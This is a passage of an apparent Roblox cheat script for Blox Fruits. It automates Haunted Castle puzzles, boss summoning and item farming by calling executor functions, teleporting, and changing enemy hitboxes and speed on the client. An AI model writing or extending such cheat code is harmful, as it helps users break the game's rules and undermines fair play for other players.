                                        toPoint(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.CFrame)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                                        wait(1)
                                        fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)

                                    elseif game:GetService("Workspace").Map["Haunted Castle"].Placard1.Left.Part.Transparency == 0 and game:GetService("Workspace").Map["Haunted Castle"].Placard1.Left:FindFirstChild("ClickDetector") then
                                        stayingPos = CFrame.new(-8764.62598, 175.802338, 6125.90381, 0.686483979, 0, -0.727144957, 0, 1, 0, 0.727144957, 0, 0.686483979)
                                        if getDistance(stayingPos) > 50 then
                                            repeat wait()
                                                toPoint(stayingPos)
                                            until getDistance(stayingPos) < 20
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard7.Left.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard7.Left:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard6.Left.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard6.Left:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard5.Left.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard5.Left:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard4.Right.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard4.Right:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard3.Left.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard3.Left:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard2.Right.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard2.Right:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                        if game:GetService("Workspace").Map["Haunted Castle"].Placard1.Right.Indicator.BrickColor ~= BrickColor.new("Pearl") then
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"].Placard1.Right:FindFirstChild("ClickDetector"))
                                            wait(.5)
                                        end
                                    elseif game:GetService("Workspace").Map["Haunted Castle"].Tablet.Segment1:FindFirstChild("ClickDetector") then
                                        tabletPos = CFrame.new(-9531.125, 13.3740034, 6050.00879, 0.994690299, -5.62031666e-08, -0.102913432, 4.61519818e-08, 1, -1.00047558e-07, 0.102913432, 9.47666834e-08, 0.994690299)
                                        if getDistance(tabletPos) > 50 then
                                            repeat wait()
                                                toPoint(tabletPos)
                                            until getDistance(tabletPos) < 20
                                        end
                                        Seg1Pos = CFrame.new(-9504.00977, 166.111038, 6286.84424, -0.883068979, -4.03647107e-08, -0.469243199, 9.83766046e-09, 1, -1.04534372e-07, 0.469243199, -9.6927316e-08, -0.883068979)
                                        Seg2Pos = CFrame.new(-9467.97461, 165.195358, 6292.6748, 0.398704827, -6.96878466e-09, -0.917079329, -7.01982543e-08, 1, -3.81179319e-08, 0.917079329, 7.9575166e-08, 0.398704827)
                                        Seg3Pos = CFrame.new(-9435.08789, 165.500595, 6285.8418, -0.987861395, 1.66232379e-08, -0.155337736, 2.49257681e-08, 1, -5.15004785e-08, 0.155337736, -5.47472503e-08, -0.987861395)
                                        Seg4Pos = CFrame.new(-9393.94434, 165.500595, 6285.83838, -0.961726785, 5.58918556e-09, 0.274010122, -1.30418454e-09, 1, -2.49751881e-08, -0.274010122, -2.43766678e-08, -0.961726785)
                                        Seg5Pos = CFrame.new(-9361.38965, 165.195358, 6292.38379, 0.921278417, 2.53615129e-09, 0.388903707, 2.69828004e-09, 1, -1.29132696e-08, -0.388903707, 1.29460878e-08, 0.921278417)
                                        Seg6Pos = CFrame.new(-9503.95312, 168.329666, 6374.89209, -0.591753781, 1.35386646e-09, 0.806118786, -3.26788396e-09, 1, -4.07836831e-09, -0.806118786, -5.04769249e-09, -0.591753781)
                                        Seg7Pos = CFrame.new(-9470.54004, 168.442581, 6373.13184, -1, 0, 0, 0, 1, 0, 0, 0, -1)
                                        Seg8Pos = CFrame.new(-9430.94824, 165.195358, 6374.99121, 0.871894658, 1.37765115e-08, -0.489693463, -3.39829711e-08, 1, -3.23734355e-08, 0.489693463, 4.48674626e-08, 0.871894658)
                                        Seg9Pos = CFrame.new(-9396.19238, 165.195358, 6376.64404, 0.257698745, -8.90260878e-08, -0.966225326, 1.1104904e-07, 1, -6.2520499e-08, 0.966225326, -9.11869407e-08, 0.257698745)
                                        Seg10Pos = CFrame.new(-9355.79688, 165.805817, 6373.37354, 0.185630456, 1.45018308e-08, 0.982619643, -1.51173012e-08, 1, -1.19024683e-08, -0.982619643, -1.26450956e-08, 0.185630456)
                                        -- Check is segment 1
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            print(v.Name, "Seg1Pos", (v.Model:GetPivot().Position - Seg1Pos.Position).Magnitude)
                                            if (v.Model:GetPivot().Position - Seg1Pos.Position).Magnitude < 28 then
                                                _G.Seg1Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        print("Rotating")
                                                        print(workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation)
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment1.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg1Found then 
                                            print("Seg1Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment1.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment1.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 2
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            print(v.Name, "Seg2Pos", (v.Model:GetPivot().Position - Seg2Pos.Position).Magnitude)
                                            if (v.Model:GetPivot().Position - Seg2Pos.Position).Magnitude < 28 then
                                                _G.Seg2Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment2.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment2.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment2.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg2Found then 
                                            print("Seg2Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment2.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment2.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment2.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment2.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 3
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg3Pos.Position).Magnitude < 28 then
                                                _G.Seg3Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment3.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment3.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment3.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg3Found then 
                                            print("Seg3Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment3.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment3.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment3.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment3.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 4
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg4Pos.Position).Magnitude < 28 then
                                                _G.Seg4Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment4.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment4.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment4.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg1Found then 
                                            print("Seg4Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment4.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment4.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment4.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment4.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 5
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg5Pos.Position).Magnitude < 28 then
                                                _G.Seg5Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment5.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment5.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment5.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg5Found then 
                                            print("Seg5Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment5.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment5.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment5.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment5.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 6
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg6Pos.Position).Magnitude < 28 then
                                                _G.Seg6Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment6.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment6.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment6.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg6Found then 
                                            print("Seg6Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment6.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment6.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment6.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment6.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 7
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            print(v.Name, "Seg7Pos", (v.Model:GetPivot().Position - Seg2Pos.Position).Magnitude)
                                            if (v.Model:GetPivot().Position - Seg7Pos.Position).Magnitude < 31 then
                                                Seg7Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment7.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment7.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment7.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg7Found then 
                                            print("Seg7Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment7.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment7.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment7.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment7.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 8
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg8Pos.Position).Magnitude < 28 then
                                                _G.Seg8Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment8.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment8.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment8.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg8Found then 
                                            print("Seg8Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment8.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment8.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment8.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment8.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 9
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg9Pos.Position).Magnitude < 28 then
                                                _G.Seg9Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment9.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment9.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment9.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg9Found then 
                                            print("Seg9Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment9.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment9.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment9.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment9.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                        -- Check is segment 10
                                        for i,v in pairs(workspace.Map["Haunted Castle"].Trophies.Quest:GetChildren()) do 
                                            if (v.Model:GetPivot().Position - Seg10Pos.Position).Magnitude < 28 then
                                                _G.Seg10Found = true
                                                if v.Handle.Rotation == Vector3.new(0,0,0) then
                                                    if workspace.Map["Haunted Castle"].Tablet.Segment10.Line.Rotation ~= Vector3.new(0,0,-90) and workspace.Map["Haunted Castle"].Tablet.Segment10.Line.Rotation ~= Vector3.new(0,0,90) then
                                                        fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment10.ClickDetector)
                                                        wait(1)
                                                    end
                                                end
                                                break
                                            end
                                        end
                                        if not _G.Seg10Found then 
                                            print("Seg10Found not found")
                                            if workspace.Map["Haunted Castle"].Tablet.Segment10.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment10.ClickDetector)
                                                wait(1)
                                            end
                                            if workspace.Map["Haunted Castle"].Tablet.Segment10.Line.Rotation ~= Vector3.new(0,0,0) then
                                                fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment10.ClickDetector)
                                                wait(1)
                                            end
                                        end
                                    else
                                        if game:GetService("Workspace").NPCs:FindFirstChild("Ghost") then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
                                            wait(.1)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                        else
                                            if getDistance(CFrame.new(-9723.35645, 278.34903, 6270.85889, -0.20922628, -5.12520799e-08, 0.977867246, -9.77344712e-08, 1, 3.15006581e-08, -0.977867246, -8.89805776e-08, -0.20922628)) > 500 then
                                                repeat wait()
                                                    toPoint(CFrame.new(-9723.35645, 278.34903, 6270.85889, -0.20922628, -5.12520799e-08, 0.977867246, -9.77344712e-08, 1, 3.15006581e-08, -0.977867246, -8.89805776e-08, -0.20922628))
                                                until getDistance(CFrame.new(-9723.35645, 278.34903, 6270.85889, -0.20922628, -5.12520799e-08, 0.977867246, -9.77344712e-08, 1, 3.15006581e-08, -0.977867246, -8.89805776e-08, -0.20922628)) < 20
                                            end
                                        end
                                    end
                                end
                            else
                                if GetMaterial("Dark Fragment") > 0 and GetMaterial("Ectoplasm") >= 250 and GetMaterial("Bones") >= 500 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("soulGuitarBuy")
                                end
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)


            Sea3ItemsSection:NewLabel(" ")
            Sea3ItemsSection:NewButton("Turn On All Haki Plates [rip_indra]", "Turn On All Haki Plates [rip_indra]", function()
                pos = LP.Character.HumanoidRootPart.CFrame
                wait()
                for i,v in pairs(game.Workspace.Map["Boat Castle"].Summoner.Circle:GetChildren()) do 
                    if v.Name == "Part" then 
                        if v.Part.BrickColor ~= BrickColor.new("Lime green") then 
                            if v.BrickColor == BrickColor.new("Oyster") then 
                                for ci,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Snow White' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Snow White")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            firetouchinterest(LP.Character.HumanoidRootPart, v.TouchInterest.Parent, 1) 
                                            wait()
                                        end
                                    end
                                end
                            end
                            if v.BrickColor == BrickColor.new("Hot pink") then 
                                for cv,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Winter Sky' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Winter Sky")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            firetouchinterest(LP.Character.HumanoidRootPart, v.TouchInterest.Parent, 1) 
                                            wait()
                                        end
                                    end
                                end
                            end
                            if v.BrickColor == BrickColor.new("Really red") then 
                                for cv,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Pure Red' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Pure Red")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            firetouchinterest(LP.Character.HumanoidRootPart, v.TouchInterest.Parent, 1) 
                                            wait()
                                        end
                                    end
                                end
                            end
                        end
                    end 
                end
                wait()
                LP.Character.HumanoidRootPart.CFrame = pos
            end)

            Sea3ItemsSection:NewButton("Spawn rip_indra [ACTIVATE PLATES BEFORE]", "Spawn rip_indra", function()
                
                pos = LP.Character.HumanoidRootPart.CFrame
                wait()
                counter = 0
                for i,v in pairs(game.Workspace.Map["Boat Castle"].Summoner.Circle:GetChildren()) do 
                    if v.Name == "Part" then 
                        if v.Part.BrickColor == BrickColor.new("Lime green") then 
                            counter = counter + 1
                        end
                    end 
                end
                if counter == 3 then
                    firetouchinterest(LP.Character.HumanoidRootPart, game.Workspace.Map["Boat Castle"].Summoner.Detection.TouchInterest.Parent, 0) 
                    wait()
                    firetouchinterest(LP.Character.HumanoidRootPart, game.Workspace.Map["Boat Castle"].Summoner.Detection.TouchInterest.Parent, 1) 
                end

                wait()
                LP.Character.HumanoidRootPart.CFrame = pos
            end)
            killIndra = Sea3ItemsSection:NewToggle("Kill Indra", "Kill Indra", function(value)
                getgenv().Settings["Kill Indra"] = value
                WriteSettings()
            end)
            if getgenv().Settings["Kill Indra"] then killIndra:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().Settings["Kill Indra"] then
                            _G.KillIndra = true
                        else
                            _G.KillIndra = false
                        end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.KillIndra then
                            if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") then
                                v = game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form")
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not _G.KillIndra or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            elseif ReplicatedStorage:FindFirstChild("rip_indra True Form") then
                                v = ReplicatedStorage:FindFirstChild("rip_indra True Form")
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not _G.KillIndra or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            end
                        end
                    end)
                end
            end)

            

            function getTushitaProgress()
                progress = ReplicatedStorage.Remotes.CommF_:InvokeServer("TushitaProgress")
                if progress.KilledLongma then 
                    return 100
                end
                if progress.OpenedDoor then
                    return 50
                else
                    return 0
                end
            end
            Sea3ItemsSection:NewLabel(" ")
            yamaProgress = Sea3ItemsSection:NewLabel("")
            spawn(function()
                while wait() do
                    pcall(function()
                        wait(100)
                        count = ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter","Progress") + ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter","Progress")
                        yamaProgress:UpdateLabel("‚öîÔ∏è Yama Progress: " .. tostring(count))
                    end)
                end
            end)

            ay = Sea3ItemsSection:NewToggle("Auto Yama", "Auto Yama", function(state)
                _G.AutoYama = state
            end)
            ayh = Sea3ItemsSection:NewToggle("Auto Yama Hop [Must have]", "Auto Yama", function(state)
                _G.AutoYamaHop = state
            end)

            if _G.AutoYama then ay:UpdateToggle(nil, true) end
            if _G.AutoYamaHop then ayh:UpdateToggle(nil, true) end

            _G.AutoTushita = false
            Sea3ItemsSection:NewToggle("Auto Tushita", "Auto Tushita [100% AUTO]", function(state)
                _G.AutoTushita = state
            end)
            AutoCDK = Sea3ItemsSection:NewToggle("Auto Cursed Dual Katana", "Auto Cursed Dual Katana [full]", function(value)
                getgenv().Settings["AutoCDK"] = value
                WriteSettings()
            end)
            if getgenv().Settings["AutoCDK"] then AutoCDK:UpdateToggle(nil, true) end

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoTushita and third_sea then
                            if not isWeaponInInventory("Tushita") then
                                progress = getTushitaProgress()
                                if progress ~= 100 then
                                    if progress == 50 then
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("Longma") then
                                            toPoint(CFrame.new(-10148.1641, 423.734192, -9543.64648, -0.93039453, -7.7153004e-09, -0.366559714, 1.02859437e-08, 1, -4.71554458e-08, 0.366559714, -4.76435815e-08, -0.93039453))
                                        else
                                            v = game:GetService("Workspace").Enemies:FindFirstChild("Longma")
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                until not _G.AutoTushita or v.Humanoid.Health <= 0 or not v.Parent
                                            end
                                        end
                                    elseif progress == 0 then
                                        if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") or ReplicatedStorage:FindFirstChild("rip_indra True Form") then
                                            if not isWeaponInInventory("Holy Torch") then
                                                wait(1)
                                                useNearestEntrance(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame)
                                                wait(.1)
                                                repeat wait()
                                                    toPoint(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame)
                                                until getDistance(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame) < 100
                                            end
                                        end
                                        if isWeaponInInventory("Holy Torch") then
                                            wait(5)
                                            repeat wait()
                                                toPoint(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame)
                                            until getDistance(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame) < 50
                                            
                                            for i,torch in pairs(game.Workspace.Map.Turtle.QuestTorches:GetChildren()) do
                                                if torch:FindFirstChild("TouchInterest") then
                                                    firetouchinterest(LP.Character.HumanoidRootPart, torch.TouchInterest.Parent, 1)
                                                    wait()
                                                    firetouchinterest(LP.Character.HumanoidRootPart, torch.TouchInterest.Parent, 0)
                                                end
                                            end
                                        end
                                    end
                                end
                            end 
                        end
                    end) 
                end
            end)
            
            

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoYama and third_sea and not isWeaponInInventory("Yama") then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter","Progress") + ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter","Progress") < 30 then
                                if LP.PlayerGui.Main.Quest.Visible == true then
                                    if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") then
                                        EliteName = "Diablo"
                                    elseif string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") then
                                        EliteName = "Deandre"
                                    elseif string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
                                        EliteName = "Urban"
                                    end
                                    if not game:GetService("Workspace").Enemies:FindFirstChild(EliteName) then
                                        if game.ReplicatedStorage:FindFirstChild(EliteName) then
                                            v = game.ReplicatedStorage:FindFirstChild(EliteName)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        else
                                            if EliteName == "Urban" then
                                                toTarget(CFrame.new(-12327.908203125, 361.136962890625, -9618.01171875))
                                            elseif EliteName == "Deandre" then
                                                toTarget(CFrame.new(-13982.4052734375, 330.6456298828125, -9260.4814453125))
